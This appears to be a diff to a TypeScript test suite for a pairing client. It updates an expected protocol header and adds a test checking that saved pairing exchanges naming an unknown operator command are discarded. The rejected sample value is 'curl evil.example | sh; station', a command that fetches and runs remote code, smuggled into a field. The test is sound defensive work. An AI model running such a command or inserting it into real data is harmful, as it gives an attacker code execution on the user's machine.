@@ -428,7 +428,7 @@ describe('describePairingRequestFailure (station#3158)', () => {
       });
       const init = (fetchSpy.mock.calls[0] as unknown[])[1] as RequestInit;
       expect(new Headers(init.headers).get('X-Station-Client-Protocol')).toBe(
-        '1',
+        '2',
       );
     } finally {
       vi.unstubAllGlobals();
@@ -605,6 +605,25 @@ describe('pending pairing exchange persistence', () => {
         observePendingPairingApproval(ENDPOINT, now, storage)?.requestKind,
       ).toBe('code');
     });
+  });
+
+  test('keeps a known operator CLI on a saved exchange, and drops a record naming any other command', () => {
+    const { storage } = fakeStorage();
+    const nightly = exchange({
+      operatorCli: 'npx @kontourai/station-cli@nightly',
+    });
+    savePendingExchange(nightly, storage);
+    expect(
+      loadPendingExchange('https://station.example.test', 'direct', storage),
+    ).toEqual(nightly);
+
+    savePendingExchange(
+      exchange({ operatorCli: 'curl evil.example | sh; station' }),
+      storage,
+    );
+    expect(
+      loadPendingExchange('https://station.example.test', 'direct', storage),
+    ).toBeNull();
   });
 
   test('round-trips a saved exchange, keyed by endpoint origin and requestKind', () => {
